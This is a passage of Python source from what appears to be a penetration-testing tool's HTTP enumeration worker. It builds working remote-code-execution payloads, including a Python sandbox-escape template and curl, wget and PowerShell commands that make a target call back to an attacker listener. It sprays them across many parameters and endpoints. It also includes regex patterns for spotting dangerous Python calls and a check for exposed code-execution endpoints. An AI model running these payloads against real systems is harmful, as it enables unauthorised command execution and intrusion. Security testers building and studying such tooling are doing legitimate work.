                        f"().__class__.__base__.__subclasses__()[{class_index}]('curl {callback_url}/shell_{class_index}', shell=True)"
                    ]
                    oob_payloads.extend(sandbox_payloads)
            
            # Send payloads using detected parameter or common parameters
            if ssti_param:
                self.signals.output.emit(f"<p style='color: #87CEEB;'>Using detected parameter: {h(ssti_param)}</p><br>")
                param_list = [ssti_param]
            else:
                param_list = ['code', 'input', 'data', 'cmd', 'exec', 'system', 'eval', 'run', 'expression', 'formula']
            
            for i, payload in enumerate(oob_payloads):
                try:
                    logging.debug("[OOB] Payload %d: %s", i+1, payload[:100])
                    
                    for param in param_list:
                        try:
                            # Send via POST to TARGET (not listener)
                            logging.debug("[OOB] Sending POST to TARGET %s: %s=%s", self.target, param, payload[:50])
                            resp = self._make_request('POST', self.target, data={param: payload}, timeout=5)
                            logging.debug("[OOB] POST response %d (%s): %s", i+1, param, resp.text[:100] if resp else "No response")
                            
                            # Send via GET (encoded) to TARGET
                            encoded = urllib.parse.quote(payload, safe='')
                            logging.debug("[OOB] Sending GET to TARGET %s: %s=%s", self.target, param, encoded[:50])
                            self._make_request('GET', f"{self.target}?{param}={encoded}", timeout=5)
                            
                            # Send via JSON POST to TARGET
                            logging.debug("[OOB] Sending JSON POST to TARGET %s", self.target)
                            self._make_request('POST', self.target, json={param: payload}, timeout=5)
                            
                            # Also try common endpoints
                            for endpoint in ['/', '/eval', '/execute', '/run']:
                                try:
                                    endpoint_url = f"{self.target.rstrip('/')}{endpoint}"
                                    self._make_request('POST', endpoint_url, data={param: payload}, timeout=3)
                                    self._make_request('GET', f"{endpoint_url}?{param}={encoded}", timeout=3)
                                except Exception as _exc:
                                    pass
                                    logger.debug("Suppressed exception", exc_info=True)
                            
                        except Exception as e:
                            logging.error("[OOB] Error with param %s: %s", param, e)
                    
                    self.signals.output.emit(f"<p style='color: #87CEEB;'>OOB payload {h(i+1)} sent to {h(self.target)} ({len(param_list)} methods)</p><br>")
                    
                    # Add delay between payloads
                    import time
                    time.sleep(0.3)
                    
                except Exception as e:
                    logging.error("[OOB] Error sending payload %d: %s", i+1, e)
                    self.signals.output.emit(f"<p style='color: #FFAA00;'>Payload {h(i+1)} failed: {h(str(e))}</p><br>")
            
            self.signals.output.emit(f"<p style='color: #00FF41;'>Enhanced OOB testing complete - payloads sent to {h(self.target)} - check listener for callbacks</p><br>")
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>OOB payload error: {h(e)}</p><br>")
    
    def _send_generic_oob_test(self, listener_info):
        """Send generic OOB test payloads to target with callback URLs"""
        try:
            import urllib.parse
            import logging
            
            # Get callback URL from listener manager
            callback_url = listener_manager.get_listener_url(self.listener_id)
            if not callback_url:
                return
            
            test_url = f"{callback_url}/fingerprint-test"
            
            # Generic RCE payloads - commands for the TARGET to execute to connect back to us
            rce_payloads = [
                f"curl {test_url}",
                f"wget {test_url}", 
                f"powershell -c \"Invoke-WebRequest {test_url}\"",  # Windows
            ]
            
            # Test parameters commonly used for command injection
            test_params = ['cmd', 'exec', 'system', 'command', 'run', 'shell', 'ping', 'host']
            
            try:
                # Send payloads to target via common injection points
                for payload in rce_payloads:
                    encoded_payload = urllib.parse.quote(payload, safe='')
                    
                    for param in test_params:
                        try:
                            # Send command TO the target - target executes it and connects back to us
                            logging.debug("[OOB] Sending to target %s: %s=%s", self.target, param, payload[:50])
                            self._make_request('GET', f"{self.target}?{param}={encoded_payload}", timeout=5)
                            self._make_request('POST', self.target, data={param: payload}, timeout=5)
                        except Exception as e:
                            logging.debug("[OOB] Request to target failed: %s", e)
                
                self.signals.output.emit(f"<p style='color: #87CEEB;'>Generic OOB test sent to target {h(self.target)} with callback {h(callback_url)}</p><br>")
                
            except Exception as e:
                self.signals.output.emit(f"<p style='color: #FFAA00;'>Generic OOB test failed: {h(str(e))}</p><br>")
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF6B6B;'>Generic OOB error: {h(str(e))}</p><br>")
    
    def _integrate_with_assets(self, results):
        """Integrate HTTP scan results with asset management"""
        try:
            # Prepare results for asset integration with resolved IP info
            asset_results = {
                'target': self.target
            }
            
            # Add resolved IP information if available
            if hasattr(self, 'resolved_ip') and hasattr(self, 'original_hostname'):
                asset_results['resolved_ip'] = self.resolved_ip
                asset_results['original_hostname'] = self.original_hostname
            
            # Add server information if available
            if 'server' in results:
                asset_results['server'] = results['server']
            
            # Add directories found
            if 'directories' in results:
                asset_results['directories'] = results['directories']
            
            # Add known files
            if 'known_files' in results:
                asset_results['known_files'] = results['known_files']
            
            # Add source code findings
            if 'source_findings' in results:
                asset_results['source_findings'] = results['source_findings']
                asset_results['detailed_findings'] = results.get('detailed_findings', {})
                asset_results['risk_assessment'] = results.get('risk_assessment', {})
            
            # Add vulnerabilities from any scan type
            vulnerabilities = []
            if 'source_findings' in results:
                for finding in results['source_findings']:
                    severity = 'Low'
                    if any(keyword in finding.lower() for keyword in ['critical', 'rce', 'execution']):
                        severity = 'Critical'
                    elif any(keyword in finding.lower() for keyword in ['high', 'dangerous', 'security']):
                        severity = 'High'
                    elif any(keyword in finding.lower() for keyword in ['medium', 'warning']):
                        severity = 'Medium'
                    
                    vulnerabilities.append({
                        'type': 'Web Application',
                        'description': finding,
                        'severity': severity,
                        'source': 'HTTP Source Code Analysis'
                    })
            
            if vulnerabilities:
                asset_results['vulnerabilities'] = vulnerabilities
            
            # Process with asset integrator
            scan_asset_integrator.process_http_results(asset_results)
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Asset integration failed: {h(str(e))}</p><br>")
    
    def _scan_for_rce_indicators(self, content, url):
        """Scan for RCE via Python Jail Bypass indicators"""
        findings = []
        detailed_findings = {}
        
        # Static analysis patterns for dangerous Python functions
        rce_patterns = {
            'Dangerous eval usage': r'\beval\s*\(',
            'Dangerous exec usage': r'\bexec\s*\(',
            'input() usage (user-controllable)': r'\binput\s*\(',
            'Use of __builtins__ (can lead to escapes)': r'__builtins__',
            'os.system usage': r'os\.system\s*\(',
            'subprocess call': r'subprocess\.(run|call|Popen|check_output)',
            'pickle.loads': r'pickle\.loads\s*\(',
            'yaml.unsafe_load': r'yaml\.load\s*\(',
            'importlib import': r'importlib\.import_module',
            'import *': r'from\s+\S+\s+import\s+\*',
            'Blacklist-based filtering': r'if\s+any\(.+?in\s+code'
        }
        
        pattern_matches = {}
        for description, pattern in rce_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                findings.append(f'RCE indicator: {description}')
                pattern_matches[description] = matches[:3]  # Limit to 3 examples
        
        if pattern_matches:
            detailed_findings['RCE indicators found'] = pattern_matches
        
        # Check for code execution endpoints in JavaScript/HTML
        endpoint_patterns = [
            r'/run_code',
            r'/execute',
            r'/eval',
            r'/sandbox',
            r'/python',
            r'/code'
        ]
        
        execution_endpoints = []
        for pattern in endpoint_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                execution_endpoints.append(pattern)
        
        if execution_endpoints:
            findings.append(f'Code execution endpoints detected ({len(execution_endpoints)} found)')
            detailed_findings['Code execution endpoints'] = execution_endpoints
        
        # Check for JavaScript code that submits Python code
        js_code_patterns = [
            r'\$\.post\([^,]+,\s*{\s*code:\s*',
            r'fetch\([^,]+,\s*{[^}]*body:[^}]*code',
            r'XMLHttpRequest[^;]*send\([^)]*code'
        ]
        
        js_execution = []
        for pattern in js_code_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
            if matches:
                js_execution.extend(matches[:2])  # Limit examples
        
        if js_execution:
            findings.append(f'JavaScript code execution patterns ({len(js_execution)} found)')
            detailed_findings['JavaScript code execution'] = js_execution
        
        # Test for live code execution endpoints if found
        if execution_endpoints:
            self._test_rce_endpoints(url, execution_endpoints, findings, detailed_findings)
        
        return findings, detailed_findings
    
    def _test_rce_endpoints(self, base_url, endpoints, findings, detailed_findings):
        """Test discovered code execution endpoints with safe payloads"""
        # Safe test payloads that don't cause harm
        test_payloads = {
            "basic_math": "2+2",
            "string_test": "'test'",
            "list_test": "[1,2,3]",
            "safe_builtin": "len('test')"
        }
        
        vulnerable_endpoints = []
        
        for endpoint in endpoints:
            test_url = f"{base_url.rstrip('/')}{endpoint}"
            
            for payload_name, payload in test_payloads.items():
                try:
                    # Test POST request with code parameter
                    response = self._make_request('POST', test_url, 
                                                data={'code': payload}, 
                                                timeout=5)
                    
                    if self._detect_rce_output(response.text, payload):
                        vulnerable_endpoints.append({
                            'endpoint': endpoint,
                            'payload': payload_name,
                            'response_snippet': response.text[:200]
                        })
                        break  # Found vulnerability, no need to test more payloads
                        
                except Exception:
                    continue
        
        if vulnerable_endpoints:
            findings.append(f'CRITICAL: Active RCE endpoints ({len(vulnerable_endpoints)} confirmed)')
            detailed_findings['Active RCE endpoints'] = vulnerable_endpoints
    
    def _detect_rce_output(self, response_text, payload):
        """Detect if response indicates code execution"""
        # Check for expected output from safe payloads
        if payload == "2+2" and "4" in response_text:
            return True
        elif payload == "'test'" and "test" in response_text:
            return True
        elif payload == "[1,2,3]" and ("[1, 2, 3]" in response_text or "1, 2, 3" in response_text):
            return True
        elif payload == "len('test')" and "4" in response_text:
            return True
        
        # Check for Python error traces that indicate code execution attempt
        error_indicators = [
            'Traceback (most recent call last):',
            'NameError:',
            'SyntaxError:',
            'ImportError:',
            'AttributeError:'
        ]
        
        for indicator in error_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def _build_nikto_tree(self, results):
        """Build tree structure for Nikto results"""
        if 'nikto_output' not in results:
            return
        
        self.crawl_tree_data = {}
        lines = results['nikto_output'].split('\n')
        for i, line in enumerate(lines):
            if line.strip() and not line.startswith('-') and not line.startswith('Nikto'):
                self.crawl_tree_data[f"nikto_{i}"] = {
                    'field': "Nikto Finding",
                    'value': line.strip(),
                    'extra': "Vulnerability",
                    'type': 'nikto_result'
                }

class HTTPWorker(HTTPEnumWorker):
    """Compatibility class"""
    pass